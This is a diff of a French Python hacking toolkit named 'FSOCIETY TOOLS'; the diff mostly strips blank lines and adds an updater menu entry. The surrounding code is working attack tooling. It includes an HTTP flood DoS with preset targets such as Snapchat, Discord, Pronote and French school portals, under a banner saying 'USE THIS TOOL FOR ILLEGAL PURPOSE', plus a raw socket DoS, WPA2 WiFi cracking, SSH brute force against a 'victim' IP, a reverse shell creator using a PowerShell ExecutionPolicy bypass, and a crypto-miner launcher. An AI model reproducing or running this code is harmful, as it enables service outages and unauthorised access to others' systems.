@@ -10,7 +10,6 @@ try:
     stop = int(config.get('parametres', "stop"))
     words = config.get('parametres', "words")
     result_file = config.get('parametres', "result")
-
 except:
     print('you need the config.cfg file  in your working directory')
 error = 0
@@ -71,7 +70,6 @@ while error<=stop_code:
         class Encode:
             def __init__(self):
                 self.enc_txt = b""
-
             def encode(self, filename):
                 i = 0
                 while i <= int(0):
@@ -81,22 +79,15 @@ while error<=stop_code:
                             text = b""  # Reset self.text for each file
                             for lines in lines_list:
                                 text += lines
-
                             enc_text = base64.b64encode(text)                    
-                        
-
                         with open(filename, "wb") as f:
                             f.write(f"{repr(enc_text.decode())}".encode())
                         i += 1
                         print(f'crypter : {i} fois')
-
                     except FileNotFoundError:
                         print('le fichier indiquer n\'a pas été trouver')
-
         #change le nom de la fen�tre
-
         System.Title("FSOCIETY")
-
         cls()
         drives = []
         for drive in range(65, 91):
@@ -120,15 +111,10 @@ while error<=stop_code:
                             print('Veuillez insérer le token')
                             i+=1
                         pass
-
             if code_pin != 1000000000000007:
-
                 exit()
-
         t.sleep(0.4)
         cls()
-
-
         def user():
             user = getpass.getuser()
             file = f"C:\\Users\\{user}\\AppData\\Local\\tools\\users.txt"
@@ -136,24 +122,19 @@ while error<=stop_code:
                 with open(file, "r") as f:
                     lines = f.readlines()
                     i = 0
-
                     while i < len(lines):
                         lines[i] = base64.b64decode(lines[i]).decode('utf-8')
                         # Supprime les caractères de nouvelle ligne à la fin de chaque ligne
                         lines[i] = lines[i].strip()
-
                         if user == lines[i]:
                             print(f'Utilisateur : {user}')
                             print(f'Compte autorisé : {lines[i]}')
                             print('Vous êtes autorisé.')
                             return True
-
                         i += 1
-
                     print(f'Utilisateur : {user}')
                     print('Accès non autorisé.')
                     return False
-
             except FileNotFoundError:
                 print("Le fichier n'a pas été trouvé, veuillez installer l'outil correctement.")
                 while True:
@@ -181,7 +162,6 @@ Administrateur'''
             print('utillisateur invalide !')
             t.sleep(0.2)
             exit()
-
         def delete():
             print('data')
             i=0
@@ -193,7 +173,6 @@ Administrateur'''
                     f.write(r'curl parrot.live')
                     i+=1
                     print('process is calculating data...')
-
         def timecode():
             date_actuelle = datetime.date.today()
             m = date_actuelle.month
@@ -215,16 +194,13 @@ Administrateur'''
             code = code.replace(b'1', b'-')
             code = code.replace(b'r', b'|')
             return code
-
         try:
             with open("C:/fsociety/keycode.txt", "r") as f:
                 keygen = f.read()
                 date_code = keygen
                 print(date_code)
-
         except:
             date_code = ""
-
         dmg = 1
         erreur = 3
         code = timecode().decode('utf-8')
@@ -250,17 +226,11 @@ Administrateur'''
         print(f'your public ip is : {publicip}')
         t.sleep(0.2)
         cls()
-
         print("""
-
 {+} FSOCIETY TOOLS
-
 {+} si vous avez un problème avec le tools mon discord: if u want to know go into the properites of the files 
-
             """)
-
         t.sleep(1.5)
-
         RED   = "\033[1;31m"  
         BLUE  = "\033[1;34m"
         CYAN  = "\033[1;36m"
@@ -268,19 +238,10 @@ Administrateur'''
         RESET = "\033[0;0m"
         BOLD    = "\033[;1m"
         REVERSE = "\033[;7m"
-
-
-
         cls()
-
         ip = socket.gethostbyname(socket.gethostname())
-
-
         while True:
-            
-
             cls()
-
             banner = f"""                                                                                                                                                                                                                                                                   
                     8888888888 .d8888b.  .d88888b.  .d8888b.8888888888888888888888888888Y88b   d88P 
                     888       d88P  Y88bd88P" "Y88bd88P  Y88b 888  888           888     Y88b d88P  
@@ -290,21 +251,12 @@ Administrateur'''
                     888             "888888     888888    888 888  888           888        888     
                     888       Y88b  d88PY88b. .d88PY88b  d88P 888  888           888        888     
                     888        "Y8888P"  "Y88888P"  "Y8888P"88888888888888888    888        888     
-                                                                                                                                                                                                                                        
                                             [+] Created By : BENJI77 
                     username : {getpass.getuser()} | my ip : {ip} | public ip : {publicip}
             """
-
-
-
             print(Colorate.Horizontal(Colors.red_to_blue, banner))
-
             print('')
-
             print('')
-
-
-
             r = r"""        1) voir l'ip local de l'appareil                                            9) reverse shell creator
     2) utiliser le DOS TOOL                                                     10) reverse shell server
     3) ip scanner and lister with hostname                                      11) system info
@@ -315,46 +267,22 @@ Administrateur'''
     8) dos tool pour adress ip                                                  16) .exe maker
     17) brute force                                                             18) clear result file
     19) ssh bruteforce                                                          20) try to get the public ip
-    21) mine bitcoin
+    21) mine bitcoin                                                            22) update tools
             """
-
-
-
             print(Colorate.Horizontal(Colors.red_to_blue, r))
-
             print('')
-
             print('')
-
-
-
             choice = input(Colorate.Horizontal(Colors.red_to_purple,'choisissez une action : '))
-
-
-
             if choice == "1":
-
-
                 print(Colorate.Horizontal(Colors.red_to_purple,f' l\'ip est {ip}'))
-
                 t.sleep(2.5)
-
                 pass
-
-
-
             if choice == "2":
-
                 # Gui Start
-
                 headers = {"User-Agent": "Flyier DoS"}
-
                 osystem = sys.platform
-
                 cls()
-
                 ascii = r'''
-
                 dP                         oo oo d88888P d88888P M""""""'YMM MMP"""""YMM MP""""""`MM 
                 88                                   d8'     d8' M  mmmm. `M M' .mmm. `M M  mmmmm..M 
                 88d888b. .d8888b. 88d888b. dP dP    d8'     d8'  M  MMMMM  M M  MMMMM  M M.      `YM 
@@ -363,18 +291,12 @@ Administrateur'''
                 88Y8888' `88888P' dP    dP 88 dP d8'     d8'     M       .MM MMb     dMM Mb.     .dM 
                                         88                       MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM 
                                         dP    
-
             [!] USE THIS TOOL FOR ILLEGAL PURPOSE
             =====================================
             {+} Created By BENJI77     
                 '''
-
-
                 print(Colorate.Horizontal(Colors.red_to_blue, ascii))
-
-
                 choice = r"""
-
                 1) snap
                 2) pronote
                 3) discord
@@ -382,226 +304,112 @@ Administrateur'''
                 5) padlet
                 6) ent ile de france (monlycee.net)
                 -) autre veuillez insérer une URL
-
                 """
-
                 print(Colorate.Horizontal(Colors.red_to_green, choice))
-
-
                 url = input(Colorate.Horizontal(Colors.red_to_green,'veuillez choisir un site a DOS : '))
-
-
-
                 if url == "1":
-
                     url = "https://web.snapchat.com"
-
-
-
                 if url == "4":
-
                     url = "https://ent77.seine-et-marne.fr"
-
-
-
                 if url == "2":
-
                     url = "https://0770920g.index-education.net/pronote"
-
-
-
                 if url == "3":
-
                     url = "https://discord.com"
-
-
-
                 if url == "5":
-
                     url = "https://padlet.com"
-                
                 if url == "6":
-
                     url = "https://ent.iledefrance.fr/timeline/timeline"
-
-
-
                 # Gui End
-
                 num = 0
-
                 reqs = []
-
                 loop = asyncio.new_event_loop()
-
                 r = 0
-
                 print()
-
                 t.sleep(0.2)
-
                 print(url)
-
-
-
                 async def fetch(session, url):
-
                     global r, reqs
-
                     start = int(time.time())
-
                     try:
-
                         crash = 0
-
                         while crash <= max_crash:
-                        
                             try:
-
                                 async with session.get(url, headers=headers) as response:
-
                                     if response:
-
                                         try:
-
                                             set_end = int(time.time())
-
                                             set_final = start - set_end
-
                                             final = str(set_final).replace("-", "")
-
                                         except:
-
                                             pass
-
                                         if response.status == 200:
-
-
                                             try:
                                                 r += 1
-
                                                 reqs.append(response.status)
-
                                                 sys.stdout.write(
-
                                                     f"Requette : {str(len(reqs))} | ping : {final} | code status rendu => {str(response.status)} | crash status {crash} / 100\r")
-
                                             except:
                                                 pass
                                         else:
-
                                             reqs.append(response.status)
                                             crash+=1
-
-
-
                                     else:
-
                                         print(Colorate.Horizontal(Colors.red_to_green, "[-] le serveur ne repond pas, essaie plutard ou verifie l'adresse!"))
                             except:
                                 pass
                         cls()
-
                         print('le site a sauter avec succes')
-
                         t.sleep(2)
-
                     except:
-
                         pass
-
                 urls = []
-
                 urls.append(url)
-
-
-
                 async def main():
-
                     tasks = []
-
                     async with aiohttp.ClientSession() as session:
-
                         for url in urls:
-
                             try:
-
                                 tasks.append(fetch(session, url))
-
                                 ddos = await asyncio.gather(*tasks)
-
                             except:
-
                                 pass
-
-
-
                 def run():
-
                     try:
-
                         loop.run_forever(asyncio.run(main()))
-
                     except:
-
                         pass
-
                 if __name__ == '__main__':
-
                     active = []
-
                     ths = []
-
                     while True:
-
                         try:
-
                             while True:
-
                                 th = threading.Thread(target=run)
-
                                 try:
-
                                     th.start()
-
                                     ths.append(th)
-
                                     sys.stdout.flush()
-
                                 except RuntimeError:
-
                                     pass
-
                         except:
-
                             pass
-
-
-
             if choice == "3":
-
                 host = {}
                 """ classe définissant le thread de scan d'adresse Ip servant à récupérer """
                 """ le hostname du périphérique réseau                                    """
-
                 class NetscanThread(threading.Thread):
-
                     """ Constructeur de la classe prend en argument les paramètres suivants: """
                     """ address : adresse IP à scanner                                       """
                     def __init__(self, address):
-
                         self.address = address
                         threading.Thread.__init__(self)
-
                     """ Définition de la méthode Run de notre classe de scan """
                     def run(self):
                         self.lookup(self.address)
-
                     """ Méthode de classe permettant de récupérer le hostname du périphérique           """
                     """ connecté au réseau. Elle prend en paramètrre la variable de classe représentant """
                     """ l'adresse IP à recherchée                                                       """
                     def lookup(self, address):
-
                         """ On gère l'exception en cas de périphérique non connecté à l'adresse IP à scanner """
                         try:
                             """ On récupère le hostname et l'alias de la machine connectée """
@@ -611,9 +419,7 @@ Administrateur'''
                             host[address] = hostname
                         except socket.herror:
                             host[address] = None
-
                 """ programme principal """
-            
                 addresses = []
                 plage = input('plage a scanner (par default 192.168.1.) : ')
                 if plage =="" or not plage.endswith('.'):
@@ -623,216 +429,106 @@ Administrateur'''
                 """ On définit une plage d'adresses IP à scanner """ 
                 for ping in range(0, 255):
                     addresses.append(f"{plage}" + str(ping))
-
                 threads = []
-
                 """ On créée autant de threads qu'il y à d'adresses IP à scanner """ 
                 netscanthreads = [NetscanThread(address) for address in addresses] 
                 for thread in netscanthreads :
                     """ Chaque thread est démarré en même temps """
                     thread.start()
                     threads.append(thread)
-
                 for thread in threads:
                     thread.join()
-
                 """ On affiche le résultat qui affiche pour chaque machine connectée son nom d'hôte """
                 for address, hostname in host.items():
                     if (hostname != None): 
                         print(address, '=>', hostname)
                         with open(result_file, "a") as result:
                             result.write(f"\n{address} => {hostname}")
-
                 t.sleep(5)
-
-
-
             if choice == "4":
-
                 exit()
-
-
-
             if choice == "5":
-
                 os.system('shutdown -s -f -t 0')
-
-
-
             if choice == "6":
-
                 user = os.environ['USERPROFILE']
-
                 sys.exit()
-
-            
-
             if choice == "7":
-
                 addr = urllib.request.urlopen('http://ip.42.pl/raw').read()
-
                 addr = addr.decode('utf-8')
-
                 print('')
-
                 print (Colorate.Horizontal(Colors.red_to_blue, f"  l\'ip publique est {addr}"))
-
                 t.sleep(4)
-
                 pass
-
             if choice == "8":
                 cls()
-
-
-                    
-
                 class ConsoleColors:
-
                     HEADER = '\033[95m'
-
                     OKBLUE = '\033[94m'
-
                     OKGREEN = '\033[92m'
-
                     WARNING = '\033[93m'
-
                     FAIL = '\033[91m'
-
                     BOLD = '\033[1m'
-
-                    
-
                 print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
-
                  ____       ____      _____           _ 
                 |  _ \  ___/ ___|    |_   _|__   ___ | |
                 | | | |/ _ \___ \ _____| |/ _ \ / _ \| |
                 | |_| | (_) |__) |_____| | (_) | (_) | |
                 |____/ \___/____/      |_|\___/ \___/|_|
-
-
                 [!] créer par : if u want to know go into the file's properties
-
-                            
-
                     ''')
-
-                    
-
                 def getport():
-
                     try:
-
                         p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
-
                         return p
-
                     except ValueError:
-
                         print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR le port doit etre un nombre, le port par default sera utiliser" + ConsoleColors.OKGREEN + "80")
-
                         return 80
-
-
-
                 host = input('ip du serveur a DOS: ')
-
                 port = getport()
-
                 speedPerRun = 65000
-
                 threads = 100
-
-
-
                 ip = socket.gethostbyname(host)
-
-
-
                 bytesToSend = random._urandom(2450)
-
-
-
                 i = 0
-
                 class Count:
-
                     packetCounter = 0 
-
-                    
-
                 def goForDosThatThing():
-
                     try:
-
                         while True:
-
                             dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
                             try:
-
                                 dosSocket.connect((ip, port))
-
                                 for i in range(speedPerRun):
-
                                     try:
-
                                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
-
                                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
-
                                         print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + f" | envoie réussi a : {ip} | " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN, end="\r")
-
                                         Count.packetCounter = Count.packetCounter + 1
-
                                     except socket.error:
-
                                         print(ConsoleColors.WARNING + "ERREUR, l'h�te est peut-�tre down ?!", end="\r")
-
                                         pass
-
                                     except KeyboardInterrupt:
-
                                         print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
-
                                         pass
-
                             except socket.error:
-
                                 print(ConsoleColors.WARNING + "ERREUR, l'h�te est peut-�tre down ?!", end="\r")
-
                                 pass
-
                             except KeyboardInterrupt:
-
                                 print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
-
                                 pass
-
                             dosSocket.close()
-
                     except KeyboardInterrupt:
-
                         print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
-
                         pass
-
-
-
                 try:
-
                     print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
-
                       _   _   _             _      ____  _             _   _             
                      / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
                     / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
                    / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
                   /_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
                                                                                 |___/ 
-
                             ''')
-
                     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ", end="\r")
                     t.sleep(0.25)
                     print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%", end="\r")
@@ -842,29 +538,16 @@ Administrateur'''
                     print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%", end="\r")
                     t.sleep(0.25)
                     print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%", end="\r")
-
-
-
                     for i in range(threads):
-
                         try:
-
                             t = Thread(target=goForDosThatThing)
-
                             t.start()
-
                         except KeyboardInterrupt:
-
                             print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")    
-
                             pass
-
                 except KeyboardInterrupt:
-
                     print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] arr�t� par l'utilisateur", end="\r")
-
                     pass
-
             if choice == "9":
                 ip = input('ip laissez vide pour automatique : ')
                 port = input('veuillez entrer le port (laissez vide pour automatique) : ')
@@ -895,7 +578,6 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                         print('starter créer avec succès')
                 except Exception as e:
                     print('error while creating the file : {e}')
-
             if choice == "10": 
                 port = input('port (1234 par default): ')
                 try: port = int(port) 
@@ -933,7 +615,6 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
             if choice =="13":
                 #!/usr/bin/env python 3.7
                 # -*- coding: utf-8 -*-
-
                 import argparse
                 import sys
                 import os
@@ -948,43 +629,31 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                     from pywifi import Profile
                 except:
                     print("Installing pywifi")
-
-
                 # By Brahim Jarrar ~
                 # GITHUB : https://github.com/BrahimJarrar/ ~
                 # CopyRight 2019 ~
-
                 try:
                     # wlan
                     wifi = PyWiFi()
                     ifaces = wifi.interfaces()[0]
-
                     ifaces.scan() #check the card
                     results = ifaces.scan_results()
-
-
                     wifi = pywifi.PyWiFi()
                     iface = wifi.interfaces()[0]
                 except:
                     print("[-] Error system")
-
                 type = False
-
                 def main(ssid, password, number):
-
                     profile = Profile() 
                     profile.ssid = ssid
                     profile.auth = const.AUTH_ALG_OPEN
                     profile.akm.append(const.AKM_TYPE_WPA2PSK)
                     profile.cipher = const.CIPHER_TYPE_CCMP
-
-
                     profile.key = password
                     iface.remove_all_network_profiles()
                     tmp_profile = iface.add_network_profile(profile)
                     t.sleep(0.1) # if script not working change time to 1 !!!!!!
                     iface.connect(tmp_profile) # trying to Connect
-
                     if ifaces.status() == const.IFACE_CONNECTED: # checker
                         t.sleep(1)
                         print(BOLD, GREEN,'[*] Crack success!',RESET)
@@ -995,7 +664,6 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                         exit()
                     else:
                         print(RED, '[{}] Crack Failed using {}'.format(number, password))
-
                 def pwd(ssid, file):
                     number = 0
                     with open(file, 'r', encoding='utf8') as words:
@@ -1004,25 +672,16 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                             line = line.split("\n")
                             pwd = line[0]
                             main(ssid, pwd, number)
-                                    
-
-
                 def menu():
                     parser = argparse.ArgumentParser(description='argparse Example')
-
                     parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
                     parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')
-
                     group1 = parser.add_mutually_exclusive_group()
-
                     group1.add_argument('-v', '--version', metavar='', help='version')
                     print(" ")
-
                     args = parser.parse_args()
-
                     print(CYAN, "[+] You are using ", BOLD, platform.system(), platform.machine(), "...")
                     t.sleep(2.5)
-
                     if args.wordlist and args.ssid:
                         ssid = args.ssid
                         filee = args.wordlist
@@ -1035,22 +694,16 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                         print(BLUE)
                         ssid = input("[*] SSID: ")
                         filee = words
-
-
                     # thx
                     if os.path.exists(filee):
                         if platform.system().startswith("Win" or "win"):
                             os.system("cls")
                         else:
                             os.system("clear")
-
                         print(BLUE,"[~] Cracking...")
                         pwd(ssid, filee)
-
                     else:
                         print(RED,"[-] No Such File.",BLUE)
-
-
                 menu()
             if choice =="14":
                 os.system('pip install -r requirements.txt')
@@ -1060,13 +713,9 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                     target = socket.gethostbyname(hostname)
                     print(f'Scan Target  > {target}')
                     return target
-
-
                 def get_port_list():
                     print(f'Ports Range  > [1 – 5000]')
                     return range(1, 5000)
-
-
                 def scan_port(target, port):
                     # Create a socket object
                     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -1074,21 +723,17 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                         test = s.connect_ex((target, port))
                         if test == 0:
                             print(f'Port {port} is [open]')
-
-
                 def port_scanner():
                     try:
                         target = get_target()
                         port_list = get_port_list()
                         thread_list = list()
                         start_time = int(time.time())
-
                         for port in port_list:
                             scan = threading.Thread(target=scan_port, args=(target, port))
                             thread_list.append(scan)
                             scan.daemon = True
                             scan.start()
-
                         for scan in thread_list:
                             scan.join()
                     except:
@@ -1096,7 +741,6 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                     else:
                         end_time = int(time.time())
                         print(f"Scanning completed in  {end_time - start_time} seconds.")
-
                 port_scanner()
                 t.sleep(2)
             if choice == "16":
@@ -1141,17 +785,13 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                                 check = True
                                 return True
                                 break
-
                 def go_for_bruteforce_that_thing():
                     password = input('Enter the password to decrypt: ')
                     start_time = Value('i', int(time.time()))
                     end_time = Value('i', 0)
                     print(f"Available threads: {os.cpu_count()}")
-
                     with open(words, 'r', encoding='utf-8') as f:
                         lines = f.readlines()
-
-
                     if not bruteforce.bf_file(password, lines, start_time, end_time):      
                         threads = []
                         choice = input('do you want to try  a random generated password? (y/N): ')
@@ -1160,11 +800,9 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                                 thread = threading.Thread(target=bruteforce.bf_rdm, args=(password, lines, start_time, end_time))
                                 thread.start()
                                 threads.append(thread)
-
                             # Wait for all threads to finish
                             for thread in threads:
                                 thread.join()
-
                 if True:
                     go_for_bruteforce_that_thing()
                     t.sleep(5)
@@ -1180,7 +818,6 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
             if choice == "19":
                 with open(words, 'r', encoding='utf-8') as f:
                     lines = f.readlines()
-                
                 ip = input('ip de la victime : ')
                 while True:
                     try:
@@ -1198,6 +835,12 @@ PowerShell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process -FilePath 
                     os.system('start miner.py')
                 except:
                     print('you can\'t mine bitcoin because you have\'t the miner module installed')
+                    time.sleep(0.2)
+            if choice == "22":
+                try:
+                    os.startfile('updater.exe')
+                except:
+                    print('une erreur est survenu, le fichier n\'existe pas ou n\'est pas a C:/fsociety/updater.exe')
                     time.sleep(0.2)
     except Exception as e:
         with open(f'C:/Users/{getpass.getuser()}/desktop/error log.txt', 'a') as f:
